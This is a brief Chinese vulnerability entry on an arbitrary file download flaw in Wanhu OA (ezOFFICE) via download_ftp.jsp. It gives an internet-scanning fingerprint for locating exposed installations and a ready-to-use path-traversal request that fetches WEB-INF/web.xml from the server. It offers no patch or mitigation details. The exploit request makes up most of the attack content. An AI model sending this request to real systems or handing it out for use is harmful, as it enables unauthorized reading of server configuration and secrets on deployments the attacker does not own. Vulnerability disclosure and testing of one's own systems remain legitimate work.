# 万户OA download_ftp.jsp 任意文件下载漏洞

## 漏洞描述

万户OA download_ftp.jsp文件存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器上的任意文件

## 漏洞影响

<a-checkbox checked>万户OA </a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="万户网络-ezOFFICE"</a-checkbox></br>

## 漏洞复现

产品页面

![img](../../../.vuepress/public/img/1631323798806-958050db-05f6-47ca-95b4-74487ee67a66.png)

验证POC

```javascript
/defaultroot/download_ftp.jsp?path=/../WEB-INF/&name=aaa&FileName=web.xml
```

![img](../../../.vuepress/public/img/1646135727614-308c38fd-932b-4dc1-a43d-aa5ddfe6898a.png)